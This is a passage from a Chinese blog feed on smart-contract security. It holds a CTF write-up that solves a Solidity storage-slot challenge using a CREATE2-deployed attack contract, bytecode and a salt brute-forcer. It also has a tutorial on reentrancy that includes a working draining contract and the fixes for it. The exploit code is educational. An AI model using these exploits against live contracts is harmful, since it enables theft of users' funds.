class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/utils/StorageSlotUpgradeable.sol&quot;;</span><br><span class="line">//这里是不是错了：&quot;@openzeppelin/contracts-upgradeable/contracts/utils/StorageSlotUpgradeable.sol&quot;才对?</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) external returns (bool);</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line"></span><br><span class="line">    string public constant name = &quot;ERC20&quot;;</span><br><span class="line">    string public constant symbol = &quot;ERC&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping (address =&gt; uint256)) allowed;</span><br><span class="line"></span><br><span class="line">    uint256 totalSupply_ = 10 ether;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public override view returns (uint256) &#123;</span><br><span class="line">        return totalSupply_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address tokenOwner) public override view returns (uint256) &#123;</span><br><span class="line">        return balances[tokenOwner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address receiver, uint256 numTokens) public override returns (bool) &#123;</span><br><span class="line">        require(numTokens &lt;= balances[msg.sender]);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender]-numTokens;</span><br><span class="line">        balances[receiver] = balances[receiver]+numTokens;</span><br><span class="line">        emit Transfer(msg.sender, receiver, numTokens);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address delegate, uint256 numTokens) public override returns (bool) &#123;</span><br><span class="line">        allowed[msg.sender][delegate] = numTokens;</span><br><span class="line">        emit Approval(msg.sender, delegate, numTokens);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address delegate) public override view returns (uint) &#123;</span><br><span class="line">        return allowed[owner][delegate];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) &#123;</span><br><span class="line">        require(numTokens &lt;= balances[owner]);</span><br><span class="line">        require(numTokens &lt;= allowed[owner][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balances[owner] = balances[owner]-numTokens;</span><br><span class="line">        allowed[owner][msg.sender] = allowed[owner][msg.sender]-numTokens;</span><br><span class="line">        balances[buyer] = balances[buyer]+numTokens;</span><br><span class="line">        emit Transfer(owner, buyer, numTokens);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract wallet &#123;</span><br><span class="line">    </span><br><span class="line">    struct Wallet&#123;</span><br><span class="line">        string walletName;</span><br><span class="line">        uint256 uniqueTokens;</span><br><span class="line">        mapping(address =&gt; uint256)balances;</span><br><span class="line">    &#125;</span><br><span class="line">    struct Slot&#123;</span><br><span class="line">        bytes32 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Wallet[])public wallets;</span><br><span class="line"></span><br><span class="line">    ERC20 public fake;</span><br><span class="line"></span><br><span class="line">    event SendFlag(string email);</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        fake = new ERC20();//wallet合约在ERC20中拥有10ETH</span><br><span class="line">        </span><br><span class="line">        wallets[address(this)].push();//新建一个钱包</span><br><span class="line">        Wallet storage wallet = wallets[address(this)][0];//wallet合约在ERC20中的第一个钱包</span><br><span class="line">        wallet.walletName=&quot;cuit&quot;;</span><br><span class="line">        wallet.uniqueTokens=1;</span><br><span class="line">        wallet.balances[address(fake)]= 10 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addWallet(string memory name,address _token,uint256 amount)public&#123;</span><br><span class="line">        //我们首先要approve自己，才可以满足此条件</span><br><span class="line">        require(IERC20(_token).transferFrom(msg.sender, address(this), amount),&quot;transferFrom failed&quot;);</span><br><span class="line"></span><br><span class="line">        wallets[msg.sender].push();</span><br><span class="line">        //好像是写错了？应该不需要-1吧，不然就不是add了而是set</span><br><span class="line">        Wallet storage wallet = wallets[msg.sender][wallets[msg.sender].length-1];</span><br><span class="line">        wallet.walletName=name;</span><br><span class="line">        wallet.uniqueTokens=1;</span><br><span class="line">        wallet.balances[_token] = amount;</span><br><span class="line">    &#125;//我认为这个是setWallet</span><br><span class="line"></span><br><span class="line">    function addWalletToken(uint256 index, address _token, uint256 amount)public&#123;</span><br><span class="line">        //我们首先要approve自己，才可以满足此条件</span><br><span class="line">        require(IERC20(_token).transferFrom(msg.sender, address(this), amount),&quot;transferFrom failed&quot;);</span><br><span class="line">        //要在范围内才可以操作</span><br><span class="line">        require(wallets[msg.sender].length - index &gt; 0);</span><br><span class="line"></span><br><span class="line">        Wallet storage wallet = wallets[msg.sender][index];</span><br><span class="line">        wallet.uniqueTokens++;</span><br><span class="line">        wallet.balances[_token] = amount;</span><br><span class="line">    &#125;//为钱包增加一个独一无二的token，并且记录</span><br><span class="line"></span><br><span class="line">    function getTokenBalance(address _addr,uint256 index,address _token) public view returns(uint256 amount)&#123;</span><br><span class="line">        return wallets[_addr][index].balances[_token];</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    function setSlot(bytes32 slot,bytes32 value) public &#123;</span><br><span class="line">        require(uint160(msg.sender) &amp; 0xff == 0x23);</span><br><span class="line">        StorageSlotUpgradeable.getBytes32Slot(slot).value = value;</span><br><span class="line">    &#125;//我们肯定是需要调用这个方法，然后修改余额</span><br><span class="line"></span><br><span class="line">    function isCompleted(string memory email)public&#123;</span><br><span class="line">        //此合约的第一个钱包在ERC20合约的余额为0</span><br><span class="line">        //初始值：10000000000000000000 =&gt; 1ETH</span><br><span class="line">        //解题：将fake修改成其他地址</span><br><span class="line">        require(wallets[address(this)][0].balances[address(fake)] == 0);</span><br><span class="line">        emit SendFlag(email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-分析题目要求"><a href="#1-分析题目要求" class="headerlink" title="1.分析题目要求"></a>1.分析题目要求</h3><p>成功调用<code>isCompleted(string memory email)</code>，返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function isCompleted(string memory email)public&#123;</span><br><span class="line">        require(wallets[address(this)][0].balances[address(fake)]==0);</span><br><span class="line">        emit SendFlag(email);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>require的意思是：将ERC20(fake)在wallets映射中的第一个钱包的余额为0</p><ol><li>IERC20接口和ERC20合约是正常实现，并不会有问题，因此我们解题的方向是在wallet合约当中</li><li>如上题目所示中的代码注释，是我的思路</li><li>我们发现，想要修改wallet在ERC20的第一个钱包的余额，只可能通过setSlot()方法</li></ol><p>这个代码<code>address(fake)</code>是<code>ERC20 public fake;</code>，在本合约当中位于slot 1。<code>address(fake)</code>如果可以修改为其他值，那么<code>wallets[address(this)][0].balances[address(fake)]</code>的值就会是0，因为只有ERC20(fake)才有10ETH，修改成任何地址，都是没钱的。</p><p>所以这道题的目标很明确了：修改slot 1的内容为0值【任意不为ERC20(fake)的地址就行】</p><h3 id="2-分析setSlot"><a href="#2-分析setSlot" class="headerlink" title="2.分析setSlot"></a>2.分析setSlot</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setSlot(bytes32 slot,bytes32 value) public &#123;</span><br><span class="line">        require(uint160(msg.sender) &amp; 0xff == 0x23);</span><br><span class="line">        StorageSlotUpgradeable.getBytes32Slot(slot).value = value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-eip-1967"><a href="#2-1-eip-1967" class="headerlink" title="2.1 eip-1967"></a>2.1 eip-1967</h4><p>这个方法有一个关键的地方：<code>StorageSlotUpgradeable.getBytes32Slot(slot).value = value;</code>。这是<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1967.md">eip-1967</a>的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/StorageSlotUpgradeable.sol">@openzeppelin实现</a>。我们知道，可以传入一个slot，然后可以获得这个slot的指针，然后就可以修改这个slot的值。</p><p>我们在这bytes32 slot传入slot 1，即：0x0000000000000000000000000000000000000000000000000000000000000001。bytes32 value修改成任何值除了ERC20(fake)的地址即可，因此我修改成全0：0x0000000000000000000000000000000000000000000000000000000000000000。</p><p>这样调用的结果就是：wallet合约中的<code>ERC20 public fake</code>被修改为全0，然后调用<code>wallets[address(this)][0].balances[address(fake)]</code>就会是0满足题意</p><h4 id="2-2-require"><a href="#2-2-require" class="headerlink" title="2.2.require"></a>2.2.require</h4><p>在调用方法之前，我们需要通过require的检验</p><p>代码的意思是：uint160(msg.sender)和0xff的&amp;结果为0x23才可以通过。msg.sender是消息的调用者，和0xff进行&amp;运算，是对最低两个16进制位进行&amp;运算</p><blockquote><p>举个例子</p><p>msg.sender=0x5B38Da6a701c568545dCfcB03FcB875f56beddC4，取0xC4</p><p>0xC4 &amp; 0xff = 1011 0100 &amp; 1111 1111 = 1011 0100。结果为0xC4</p></blockquote><p>因此，如果我们想要通过require的检验，那么msg.sender的最低两位得是0x23。但是我们的钱包地址不满足条件，去找一个满足这样条件的钱包不切实际，因此我们可以使用create2操作码来生成一个拥有这个特性的合约，让这个合约来调用。注意：这个合约得是在构造器当中进行调用setSlot()方法，这样msg.sender才是合约本身</p><p>之前做过类似的题目，见本博客文章: [security-04]</p><ul><li>构造一个攻击的合约</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line"></span><br><span class="line">    address wallet = 0x56a2777e796eF23399e9E1d791E1A0410a75E31b;</span><br><span class="line">    bytes32 slot  = 0x0000000000000000000000000000000000000000000000000000000000000001;</span><br><span class="line">    bytes32 value = 0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        wallet.call(abi.encodeWithSignature(&quot;setSlot(bytes32,bytes32)&quot;,slot,value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>用于调用create2方法的合约</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract DeployHack &#123;</span><br><span class="line">    bytes attackCode = hex&quot;60806040527356a2777e796ef23399e9e1d791e1a0410a75e31b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160001b6001556000801b60025534801561007357600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001546002546040516024016100c29291906101af565b6040516020818303038152906040527fd3607ed9000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161014c9190610249565b6000604051808303816000865af19150503d8060008114610189576040519150601f19603f3d011682016040523d82523d6000602084013e61018e565b606091505b505050610260565b6000819050919050565b6101a981610196565b82525050565b60006040820190506101c460008301856101a0565b6101d160208301846101a0565b9392505050565b600081519050919050565b600081905092915050565b60005b8381101561020c5780820151818401526020810190506101f1565b60008484015250505050565b6000610223826101d8565b61022d81856101e3565b935061023d8185602086016101ee565b80840191505092915050565b60006102558284610218565b915081905092915050565b603f8061026e6000396000f3fe6080604052600080fdfea2646970667358221220c0b81714a89c1e851adbea03e201af3f4dcb4cc4f68ad9ba9db46e3582fdad8764736f6c63430008110033&quot;;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>python获得对应的salt</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;0xffb5465ED8EcD4F79dD4BE10A7C8e7a50664e5eeEB&#x27;</span></span><br><span class="line"></span><br><span class="line">s3= <span class="string">&#x27;0bd443cab067564631245778699763e7b76d56da87acea443512d39abe604aa2&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    s = s1+salt+s3</span><br><span class="line">    hashed = Web3.sha3(hexstr=s)</span><br><span class="line">    hashed_str = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;23&#x27;</span> <span class="keyword">in</span> hashed_str[<span class="number">62</span>:]:</span><br><span class="line">        <span class="built_in">print</span>(salt,hashed_str)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(salt)</span><br></pre></td></tr></table></figure><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>1.部署题目</p><p><img src="https://moe.photo/images/2023/01/15/image-20230113191036897.png" alt></p><p>2.编译攻击合约，并且获取bytecode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytecode = 60806040527356a2777e796ef23399e9e1d791e1a0410a75e31b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160001b6001556000801b60025534801561007357600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001546002546040516024016100c29291906101af565b6040516020818303038152906040527fd3607ed9000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161014c9190610249565b6000604051808303816000865af19150503d8060008114610189576040519150601f19603f3d011682016040523d82523d6000602084013e61018e565b606091505b505050610260565b6000819050919050565b6101a981610196565b82525050565b60006040820190506101c460008301856101a0565b6101d160208301846101a0565b9392505050565b600081519050919050565b600081905092915050565b60005b8381101561020c5780820151818401526020810190506101f1565b60008484015250505050565b6000610223826101d8565b61022d81856101e3565b935061023d8185602086016101ee565b80840191505092915050565b60006102558284610218565b915081905092915050565b603f8061026e6000396000f3fe6080604052600080fdfea2646970667358221220c0b81714a89c1e851adbea03e201af3f4dcb4cc4f68ad9ba9db46e3582fdad8764736f6c63430008110033</span><br></pre></td></tr></table></figure><p><img src="https://moe.photo/images/2023/01/15/image-20230113191122033.png" alt></p><p>3.获得keccak256(bytecode)</p><p><img src="https://moe.photo/images/2023/01/15/image-20230113191432042.png" alt></p><p>4.计算salt = 000000000000000000000000000000000000000000000000000000000000001a</p><p><img src="https://moe.photo/images/2023/01/15/image-20230113191748104.png" alt></p><p>5.部署create2目标合约进行攻击，成功修改ERC20(fake)</p><p><img src="https://moe.photo/images/2023/01/15/image-20230113191944527.png" alt></p><p>6.调用isComplete()，完成</p><p><img src="https://moe.photo/images/2023/01/15/image-20230113192057602.png" alt></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>直接修改存储数值的插槽，而不是修改存储地址的插槽</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19.重入攻击_2</title>
      <link href="/2023/06/23/00.security/19.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_2/"/>
      <url>/2023/06/23/00.security/19.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_2/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击-2"><a href="#重入攻击-2" class="headerlink" title="重入攻击_2"></a>重入攻击_2</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>重入漏洞相信大家都有所耳闻了，那么什么是重入漏洞呢？</p><p>以太坊智能合约的特点之一是合约之间可以进行相互间的外部调用。同时，以太坊的转账不仅仅局限于外部账户，合约账户同样可以拥有以太并进行转账等操作，且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用。</p><p>我们先给重入漏洞下个定义：可以认为合约中所有的外部调用都是不安全的，都有可能存在重入漏洞。例如：如果外部调用的目标是一个攻击者可以控制的恶意的合约，那么当被攻击的合约在调用恶意合约的时候，攻击者可以执行恶意的逻辑，然后再重新进入到被攻击合约的内部，通过这样的方式来发起一笔非预期的外部调用，从而影响被攻击合约正常的执行逻辑。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>好了，看完上面的前置知识我相信大家对重入漏洞都有了一个大致的了解，那么在真实的环境中开发者写出什么样的代码会出现重入漏洞呢，下面我们来看一个比较典型的有重入漏洞的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>看到这里大家可能会有疑惑了，上面的代码就是个普通的充提币的合约，凭什么说他有重入攻击呢？我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call{value: bal}），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p><ul><li>所有的外部调用都是不安全的，且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li><li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后，才将账户余额清零的，那我们可不可以在转账外部调用的时候，构造一个恶意的逻辑合约，在合约执行 balance[msg.sender]=0 之前，一直循环调用 withdraw 函数，一直提币从而将合约账户清空呢？</li></ul><p>下面我们看看攻击者编写的攻击合约中的攻击手法是否与我们的漏洞分析相同：</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback is called when EtherStore sends Ether to this contract.</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherStore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到 EtherStore 合约是一个充提合约，我们可以在其中充提以太。下面我们将利用攻击合约将 EtherStore 合约中用户的余额清零的：</p><p>这里我们将引用三个角色，分别为：</p><p>用户：Alice，Bob</p><p>攻击者：Eve</p><ol><li>部署 EtherStore 合约；</li><li>用户 1（Alice）和用户 2（Bob）都分别将 1 个以太币充值到 EtherStore 合约中；</li><li>攻击者 Eve 部署 Attack 合约时传入 EtherStore 合约的地址；</li><li>攻击者 Eve 调用 Attack.attack 函数，Attack.attack 又调用 EtherStore.deposit 函数，充值 1 个以太币到 EtherStore 合约中，此时 EtherStore 合约中共有 3 个以太，分别为 Alice、Bob 的 2 个以太和攻击者 Eve 刚刚充值进去的 1 个以太。然后 Attack.attack 又调用 EtherStore.withdraw 函数将自己刚刚充值的以太取出，此时 EtherStore 合约中就只剩下 Alice、Bob 的 2 个以太了；</li><li>当 Attack.attack 调用 EtherStore.withdraw 提取了先前 Eve 充值的 1 个以太时，会触发 Attack.fallback 函数。这时只要 EtherStore 合约中的以太大于或等于 1 Attack.fallback 就会一直调用 EtherStore.withdraw 函数，将 EtherStore 合约中的以太提取到 Attack 合约中，直到 EtherStore 合约中的以太小于 1 。这样攻击者 Eve 会得到 EtherStore 合约中剩下的 2 个以太币（Alice、Bob 充值的两枚以太币）。</li></ol><p>下面是攻击者的函数调用流程图：</p><p><img src="/2023/06/23/00.security/19.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_2/640.png" alt="图片"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>看了上面的攻击手法相信大家对重入漏洞都会有一个自己的认知，但是只会攻击可不行，我们的目的是为了防御，那么作为开发人员如何避免写出漏洞代码还有作为审计人员如何快速发现问题代码呢，下面我们就以这两个身份来分析如何防御重入漏洞和如何在代码中快速找出重入漏洞：</p><p><strong>作为开发人员</strong></p><ul><li>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）；</li><li>加入防重入锁。</li></ul><p>下面是一个防重入锁的代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked = true;</span><br><span class="line">        _;</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>作为审计人员</strong></p><p>作为审计人员我们需要关注的是重入漏洞的特征：所有涉及到外部合约调用的代码位置都是不安全的。这样在审计过程中需要重点关注外部调用，然后推演外部调用可能产生的危害，这样就能判断这个地方是否会因为重入点而产生危害。</p><p>引用：<a href="https://mp.weixin.qq.com/s/4j5_CirSySE1GLd3BP9CZQ">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18.整数溢出_2</title>
      <link href="/2023/06/23/00.security/18.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_2/"/>
      <url>/2023/06/23/00.security/18.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_2/</url>
      
